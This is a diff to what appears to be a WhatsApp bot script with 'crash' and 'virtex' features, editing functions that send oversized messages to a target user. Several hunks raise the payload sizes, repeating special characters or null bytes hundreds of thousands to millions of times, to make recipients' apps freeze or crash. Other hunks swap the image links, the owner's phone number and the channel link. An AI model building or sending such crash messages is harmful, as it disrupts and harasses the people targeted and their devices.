@@ -346,7 +346,7 @@ async function sendExtendedTextMessage(jid) {
         'stanzaId': jid,
         'participant': jid,
         'quotedMessage': {
-          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(500000)
         },
         'disappearingMode': {
           'initiator': "CHANGED_IN_CHAT",
@@ -588,7 +588,7 @@ async function ListMSGVIP3(userJid) {
                         "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                 },
                             ],
-                            messageParamsJson: ''.repeat(999999),
+                            messageParamsJson: ''.repeat(9999999),
                         },
                     },
                 },
@@ -608,7 +608,7 @@ async function ListMSGVIP4(userJid) {
         proto.Message.fromObject({
             listMessage: {
                 title:
-              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
+              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(9200000),
                 footerText: '',
                 description: '',
                 buttonText: null,
@@ -686,7 +686,7 @@ _*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_
 𝗗𝗮𝘀𝗮𝗿 
 𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
 𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.
-乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),
+乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(500000),
 
     "sequenceNumber": "0",
 
@@ -1396,7 +1396,7 @@ fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
 replyz(`${prem1} \`Anjayy Di Addprem\``)
 await sleep(3500)
 GlobalTechInc.sendMessage(prem1 + '@s.whatsapp.net', {
-image: { url: 'https://telegra.ph/file/da3366bb4fd252566d065.jpg' },
+image: { url: 'https://i.imgur.com/VbrM8r9.jpeg' },
 caption: 'Kamu sekarang adalah User Premium!!'
 }, { quoted: m })
 break
@@ -2023,7 +2023,7 @@ case 'owner': {
 			key: m.key,
 		}
 	})
-	let img = "http://telegra.ph/file/9a332c815ad31956d5ce6.jpg"
+	let img = "https://i.imgur.com/VbrM8r9.jpeg"
 	async function image(url) {
 		const {
 			imageMessage
@@ -2056,7 +2056,7 @@ case 'owner': {
 								nativeFlowMessage: {
 									buttons: [{
 										name: "cta_url",
-										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/923444844060?text=Halo+owner+ganteng","webview_presentation":null}',
+										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/254769365617?text=Halo+owner+ganteng","webview_presentation":null}',
 									}, ],
 								},
 							}, {
@@ -2070,7 +2070,7 @@ case 'owner': {
 								nativeFlowMessage: {
 									buttons: [{
 										name: "cta_url",
-										buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07","merchant_url":"https://www.google.com"}',
+										buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029VafrbsKG8l5EFBDDCy41","merchant_url":"https://www.google.com"}',
 									}, ],
 								},
 							}, ],
